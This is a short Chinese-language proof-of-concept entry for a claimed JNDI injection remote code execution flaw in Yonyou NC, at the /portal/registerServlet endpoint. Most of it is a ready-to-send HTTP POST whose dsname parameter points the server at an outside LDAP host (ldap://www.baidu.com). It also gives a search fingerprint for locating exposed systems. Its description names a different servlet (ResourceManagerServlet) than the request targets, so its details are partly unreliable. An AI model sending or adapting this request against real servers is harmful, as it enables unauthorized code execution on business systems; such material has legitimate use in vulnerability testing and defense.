﻿# 用友NC-JNDI远程代码执行-registerServlet

> 更新时间：2024-05-14

> 漏洞编号：

> 漏洞说明：用友-NC-Cloud ResourceManagerServlet 接口存在反序列化漏洞，使得攻击者可以通过构造特定的请求远程执行恶意代码。此漏洞可能导致攻击者获取系统权限、执行任意命令，严重威胁系统的机密性和完整性。

> 漏洞特征：app="用友-UFIDA-NC"

> 验证脚本：HTTP

```
POST /portal/registerServlet HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*; q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,zh-CN;q=0.6
Content-Type: application/x-www-form-urlencoded
 
type=1&dsname=ldap://www.baidu.com
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：用友NC-JNDI远程代码执行-registerServlet.poc

